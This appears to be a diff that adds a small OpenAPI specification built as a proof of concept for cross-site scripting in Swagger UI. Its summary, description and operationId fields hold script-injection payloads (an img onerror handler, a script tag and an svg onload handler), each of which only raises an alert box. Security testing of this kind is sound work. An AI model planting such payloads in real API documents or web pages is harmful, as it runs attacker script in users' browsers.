@@ -1,0 +1,27 @@
+{
+  "openapi": "3.0.0",
+  "info": {
+    "title": "PoC Swagger XSS",
+    "version": "1.0.0",
+    "description": "Swagger UI XSS PoC"
+  },
+  "servers": [
+    {
+      "url": "https://xss.smarpo.com/api"
+    }
+  ],
+  "paths": {
+    "/xss-test": {
+      "get": {
+        "summary": "XSS Test <img src=x onerror=alert('summary')>",
+        "description": "<script>alert('description')</script>",
+        "operationId": "xss_<svg/onload=alert('operationId')>",
+        "responses": {
+          "200": {
+            "description": "Successful response"
+          }
+        }
+      }
+    }
+  }
+}
